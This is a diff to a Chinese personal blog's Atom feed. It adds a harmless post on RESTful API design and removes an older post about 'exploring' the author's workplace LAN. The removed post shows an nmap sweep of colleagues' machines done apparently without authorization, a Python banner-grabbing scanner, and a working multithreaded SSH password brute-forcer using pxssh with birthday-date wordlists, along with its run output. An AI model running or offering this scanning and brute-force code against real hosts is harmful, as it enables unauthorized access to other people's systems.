@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://microndgt.github.io/"/>
-  <updated>2017-02-24T07:36:01.000Z</updated>
+  <updated>2017-02-27T01:44:21.000Z</updated>
   <id>http://microndgt.github.io/</id>
   
   <author>
@@ -14,6 +14,71 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>理解RESTful架构</title>
+    <link href="http://microndgt.github.io/2017/02/27/%E7%90%86%E8%A7%A3RESTful%E6%9E%B6%E6%9E%84/"/>
+    <id>http://microndgt.github.io/2017/02/27/理解RESTful架构/</id>
+    <published>2017-02-27T01:43:24.000Z</published>
+    <updated>2017-02-27T01:44:21.000Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="理解RESTful架构"><a href="#理解RESTful架构" class="headerlink" title="理解RESTful架构"></a>理解RESTful架构</h1><p>Representational State Transfer 表现层状态转化</p>
+<p>表现层其实是指的是资源的表现层，所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。</p>
+<p>我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。URI只代表资源的实体，不代表它的形式。而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。所以设计API的URI时候，去除表现层，只保留资源的位置。</p>
+<p>如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。</p>
+<h2 id="RESTful架构"><a href="#RESTful架构" class="headerlink" title="RESTful架构"></a>RESTful架构</h2><ol>
+<li>每一个URI代表一种资源；</li>
+<li>客户端和服务器之间，传递这种资源的某种表现层，比如json</li>
+<li>客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。</li>
+</ol>
+<h2 id="常见误区"><a href="#常见误区" class="headerlink" title="常见误区"></a>常见误区</h2><ol>
+<li>最常见的一种设计错误，就是URI包含动词。资源表示一种实体，应该是名词，URI不应该有动词，动词应该放在HTTP协议中。资源不能是动词，但是可以是一种服务。</li>
+<li>在URI中加入版本号，不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Accept: vnd.example-com.foo+json; version=1.0</div><div class="line">Accept: vnd.example-com.foo+json; version=1.1</div></pre></td></tr></table></figure>
+<h1 id="RESTful-API-设计指南"><a href="#RESTful-API-设计指南" class="headerlink" title="RESTful API 设计指南"></a>RESTful API 设计指南</h1><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>路径又称”终点”（endpoint），表示API的具体网址。在RESTful架构中，每个网址代表一种资源（resource），所以网址中不能有动词，只能有名词，而且所用的名词往往与数据库的表格名对应。一般来说，数据库中的表都是同种记录的”集合”（collection），所以API中的名词也应该使用复数。</p>
+<h2 id="HTTP动词"><a href="#HTTP动词" class="headerlink" title="HTTP动词"></a>HTTP动词</h2><p>对于资源的具体操作类型，由HTTP动词表示。常用的HTTP动词有下面五个（括号里是对应的SQL命令）。</p>
+<ul>
+<li>GET（SELECT）：从服务器取出资源（一项或多项）。</li>
+<li>POST（CREATE）：在服务器新建一个资源。</li>
+<li>PUT（UPDATE）：在服务器更新资源（客户端提供改变后的完整资源）。</li>
+<li>PATCH（UPDATE）：在服务器更新资源（客户端提供改变的属性）。</li>
+<li>DELETE（DELETE）：从服务器删除资源。</li>
+</ul>
+<h2 id="过滤信息"><a href="#过滤信息" class="headerlink" title="过滤信息"></a>过滤信息</h2><p>如果记录数量很多，服务器不可能都将它们返回给用户。API应该提供参数，过滤返回结果。</p>
+<ul>
+<li>?limit=10：指定返回记录的数量</li>
+<li>?offset=10：指定返回记录的开始位置。</li>
+<li>?page=2&amp;per_page=100：指定第几页，以及每页的记录数。</li>
+<li>?sortby=name&amp;order=asc：指定返回结果按照哪个属性排序，以及排序顺序。</li>
+<li>?animal_type_id=1：指定筛选条件</li>
+</ul>
+<h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2><p>如果状态码是4xx，就应该向用户返回出错信息。一般来说，返回的信息中将error作为键名，出错信息作为键值即可。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    error: &quot;Invalid API key&quot;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="返回结果"><a href="#返回结果" class="headerlink" title="返回结果"></a>返回结果</h2><ul>
+<li>GET /collection：返回资源对象的列表（数组）</li>
+<li>GET /collection/resource：返回单个资源对象</li>
+<li>POST /collection：返回新生成的资源对象</li>
+<li>PUT /collection/resource：返回完整的资源对象</li>
+<li>PATCH /collection/resource：返回完整的资源对象</li>
+<li>DELETE /collection/resource：返回一个空文档</li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;理解RESTful架构&quot;&gt;&lt;a href=&quot;#理解RESTful架构&quot; class=&quot;headerlink&quot; title=&quot;理解RESTful架构&quot;&gt;&lt;/a&gt;理解RESTful架构&lt;/h1&gt;&lt;p&gt;Representational State Transfer 表现
+    
+    </summary>
+    
+      <category term="web" scheme="http://microndgt.github.io/categories/web/"/>
+    
+    
+      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
+    
+      <category term="计算机网络" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
   
   <entry>
     <title>Using Mix-Ins With Python</title>
@@ -197,59 +262,6 @@
       <category term="计算机科学" scheme="http://microndgt.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
     
       <category term="WireShark" scheme="http://microndgt.github.io/tags/WireShark/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>网络探险记1</title>
-    <link href="http://microndgt.github.io/2017/02/20/%E7%BD%91%E7%BB%9C%E6%8E%A2%E9%99%A9%E8%AE%B01/"/>
-    <id>http://microndgt.github.io/2017/02/20/网络探险记1/</id>
-    <published>2017-02-20T08:52:29.000Z</published>
-    <updated>2017-02-20T12:06:55.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈</p>
-<p>最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以探险的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。</p>
-<p>第一步查看下局域网中有哪些打开的端口，祭上大杀器NMAP扫描器！</p>
-<h1 id="NMAP扫描"><a href="#NMAP扫描" class="headerlink" title="NMAP扫描"></a>NMAP扫描</h1><p>使用客户端也行，命令行也行，命令：<code>nmap -p 1-65535 -T4 -A -v 192.168.0.*</code>，这里只检测TCP连接。检测很快就有结果了：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Initiating SYN Stealth Scan at 16:28</div><div class="line">Scanning 8 hosts [65535 ports/host]</div><div class="line">Discovered open port 445/tcp on 192.168.0.104</div><div class="line">Discovered open port 8888/tcp on 192.168.0.101</div><div class="line">Discovered open port 8080/tcp on 192.168.0.112</div><div class="line">Discovered open port 3306/tcp on 192.168.0.117</div><div class="line">Discovered open port 22/tcp on 192.168.0.117</div><div class="line">Discovered open port 80/tcp on 192.168.0.1</div><div class="line">Discovered open port 135/tcp on 192.168.0.104</div><div class="line">Discovered open port 139/tcp on 192.168.0.104</div><div class="line">SYN Stealth Scan Timing: About 0.57% done</div></pre></td></tr></table></figure>
-<p>这里的端口逐一介绍下：</p>
-<ul>
-<li>445端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，估计是公司的可联网打印机，常用入侵端口</li>
-<li>8888端口，这个是和我合作的前端妹纸的电脑开的，是测试前端程序呢，不打搅啦</li>
-<li>8080端口，这个我发送了个GET请求 <code>/index</code>，返回了官网数据，看来是一个web服务器</li>
-<li>3306端口，这个是MySQL的默认端口，常用入侵端口</li>
-<li>22端口，ssh端口,可以用于登录</li>
-<li>80端口，是为HTTP开放的,连路由器用的</li>
-<li>135端口，Microsoft在这个端口运行DCE RPC end-point mapper为它的DCOM服务。常用入侵端口</li>
-<li>139端口，NetBIOS File and Print Sharing 通过这个端口进入的连接试图获得NetBIOS/SMB服务。常用入侵端口</li>
-</ul>
-<p>这个<code>192.168.0.104</code>开了这么多易入侵端口，就不怕吗？我发现断了打印机的电，仍然有这个IP的存在，看来不是打印机，那会是哪台主机这么随便？</p>
-<h1 id="获取banner"><a href="#获取banner" class="headerlink" title="获取banner"></a>获取banner</h1><p>这里写了一个漏洞扫描器，也就是向每个IP，每个可能的端口发送连接请求，查看返回的banner</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line">def retBanner(ip, port):</div><div class="line">    try:</div><div class="line">        socket.setdefaulttimeout(2)</div><div class="line">        s = socket.socket()</div><div class="line">        s.connect((ip, port))</div><div class="line">        # 连接后的返回值</div><div class="line">        banner = s.recv(1024)</div><div class="line">        return banner</div><div class="line">    except:</div><div class="line">        return</div><div class="line">def checkVulns(banners, filename):</div><div class="line">    &apos;&apos;&apos;检查是否是漏洞，检查列表从文件读取&apos;&apos;&apos;</div><div class="line">    f = open(filename, &apos;r&apos;)</div><div class="line">    for line in f.readlines():</div><div class="line">        if line.strip(&apos;\n&apos;) in banners:</div><div class="line">            print(&apos;server is vulnerable:&apos; + banners.strip(&apos;\n&apos;))</div><div class="line">def main():</div><div class="line">    &apos;&apos;&apos;执行的主函数&apos;&apos;&apos;</div><div class="line">    portList = [21, 22, 25, 80, 110, 443]</div><div class="line">    for x in range(100, 150):</div><div class="line">        ip = &apos;192.168.0.&apos; + str(x)</div><div class="line">        for port in portList:</div><div class="line">            print(&quot;ip:&quot;, ip, &quot; port:&quot;, port)</div><div class="line">            banner = retBanner(ip, port)</div><div class="line">            # 如果存在返回值</div><div class="line">            if banner:</div><div class="line">                print(ip + &quot;: &quot; + banner.decode(&apos;utf-8&apos;))</div><div class="line">                # checkVulns(banner, filename)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<p>最后结果发现有这么几台主机开了ssh服务，可以进行远程登录，但是都需要密码，所以只好暴力猜解咯。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">ip: 192.168.0.117  port: 22</div><div class="line">192.168.0.117: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.117  port: 25</div><div class="line">ip: 192.168.0.117  port: 80</div><div class="line">ip: 192.168.0.117  port: 110</div><div class="line">ip: 192.168.0.117  port: 443</div><div class="line">ip: 192.168.0.118  port: 21</div><div class="line">ip: 192.168.0.118  port: 22</div><div class="line">192.168.0.118: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.118  port: 25</div><div class="line">ip: 192.168.0.118  port: 80</div><div class="line">ip: 192.168.0.118  port: 110</div><div class="line">ip: 192.168.0.118  port: 443</div><div class="line">ip: 192.168.0.119  port: 21</div><div class="line">ip: 192.168.0.119  port: 22</div><div class="line">192.168.0.119: SSH-2.0-OpenSSH_7.2</div><div class="line">ip: 192.168.0.119  port: 25</div></pre></td></tr></table></figure>
-<h1 id="ssh登录暴力猜解"><a href="#ssh登录暴力猜解" class="headerlink" title="ssh登录暴力猜解"></a>ssh登录暴力猜解</h1><h2 id="破解字典"><a href="#破解字典" class="headerlink" title="破解字典"></a>破解字典</h2><p>一个黑客能不能破解密码，主要看他的字典大不大= =</p>
-<h2 id="开始破解"><a href="#开始破解" class="headerlink" title="开始破解"></a>开始破解</h2><p>这里是一个暴力猜解程序，使用了多线程，密码就用<code>19800101</code>以来的生日值做测试，所以大家以后不要用生日来做密码啦，很容易被破解的。</p>
-<p>使用了<code>pexpect</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line"># coding=utf-8</div><div class="line"># 安装pxssh包</div><div class="line"># wget http://pexpect.sourceforge.net/pexpect-2.3.tar.gz</div><div class="line"># tar -xzf pexpect-2.3.tar.gz</div><div class="line"># cd pexpect-2.3</div><div class="line"># sudo python setup.py install</div><div class="line">import pexpect.pxssh as pxssh</div><div class="line">import optparse</div><div class="line">import time</div><div class="line">from threading import *</div><div class="line">maxConnections = 5</div><div class="line"># 相当于可用资源数acquire -1 release +1 然后release会检查上限</div><div class="line">connection_lock = BoundedSemaphore(value=maxConnections)</div><div class="line">Found = False</div><div class="line">Fails = 0</div><div class="line"># pxssh可以用预先写好的login(),logout()和prompt()等函数直接与ssh交互</div><div class="line">def connect(host, user, password, release):</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    try:</div><div class="line">        s = pxssh.pxssh()</div><div class="line">        s.login(host, user, password)</div><div class="line">        # 如果登陆成功说明找到密码</div><div class="line">        print(&apos;[+] Password Found:&apos; + password)</div><div class="line">        Found = True</div><div class="line">    except Exception as e:</div><div class="line">        # 说明ssh服务器被大量连接刷爆了</div><div class="line">        if &apos;read_nonblocking&apos; in str(e):</div><div class="line">            Fails += 1</div><div class="line">            time.sleep(5)</div><div class="line">            connect(host, user, password, False)</div><div class="line">            # 提示符提取困难</div><div class="line">        elif &apos;synchronize with original prompt&apos; in str(e):</div><div class="line">            time.sleep(1)</div><div class="line">            connect(host, user, password, False)</div><div class="line">    finally:</div><div class="line">        if release:</div><div class="line">            connection_lock.release()</div><div class="line">def main():</div><div class="line">    global Found</div><div class="line">    global Fails</div><div class="line">    # 一个命令行解析</div><div class="line">    parser = optparse.OptionParser(&apos;usage%prog -H &lt;target host&gt; -u &lt;user&gt; -F &lt;password file&gt;&apos;)</div><div class="line">    parser.add_option(&apos;-H&apos;, dest=&apos;tgtHost&apos;, type=&apos;string&apos;, help=&apos;specify target host&apos;)</div><div class="line">    parser.add_option(&apos;-F&apos;, dest=&apos;passwordFile&apos;, type=&apos;string&apos;, help=&apos;specify password file&apos;)</div><div class="line">    parser.add_option(&apos;-u&apos;, dest=&apos;user&apos;, type=&apos;string&apos;, help=&apos;specify the user&apos;)</div><div class="line">    # 定义完所有参数之后开始解析传入的参数</div><div class="line">    (options, args) = parser.parse_args()</div><div class="line">    # options包含所有参数</div><div class="line">    host = options.tgtHost</div><div class="line">    passwordFile = options.passwordFile</div><div class="line">    user = options.user</div><div class="line">    if host == None or passwordFile == None or user == None:</div><div class="line">        print(parser.usage)</div><div class="line">        exit(0)</div><div class="line">    fn = open(passwordFile, &apos;r&apos;)</div><div class="line">    for line in fn.readlines():</div><div class="line">        if Found:</div><div class="line">            print(&quot;Password Found&quot;)</div><div class="line">            exit(0)</div><div class="line">        if Fails &gt; 5:</div><div class="line">            print(&quot;too many socket timeouts&quot;)</div><div class="line">            exit(0)</div><div class="line">        connection_lock.acquire()</div><div class="line">        password = line.strip(&apos;\r&apos;).strip(&apos;\n&apos;)</div><div class="line">        print(&quot;Testing:&quot; + str(password))</div><div class="line">        t = Thread(target=connect, args=(host, user, password, True))</div><div class="line">        t.start()</div><div class="line">        # time.sleep(0.1)</div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">    main()</div></pre></td></tr></table></figure>
-<p>破解中：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Testing:19940629</div><div class="line">Testing:19940630</div><div class="line">Testing:19940701</div><div class="line">Testing:19940702</div><div class="line">Testing:19940703</div></pre></td></tr></table></figure>
-<p>然并卵，破解失败。。。看来这个主机的主人机智的没有使用生日做密码。。。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;我们的目标是－－－成为一名黑客～ 虽然现在啥都不会，可是有一颗黑客的心（秘制尴尬），哈哈哈&lt;/p&gt;
-&lt;p&gt;最近深入研究了计算机网络，并且一直在开发web服务器，所以突发奇想看看自己所在局域网有没有可以探险的主机;-)，公司的小伙伴可不要打我哟，我只是看看，不搞事情。。。&lt;/
-    
-    </summary>
-    
-      <category term="黑客" scheme="http://microndgt.github.io/categories/%E9%BB%91%E5%AE%A2/"/>
-    
-    
-      <category term="编程" scheme="http://microndgt.github.io/tags/%E7%BC%96%E7%A8%8B/"/>
-    
-      <category term="黑客" scheme="http://microndgt.github.io/tags/%E9%BB%91%E5%AE%A2/"/>
     
   </entry>
   
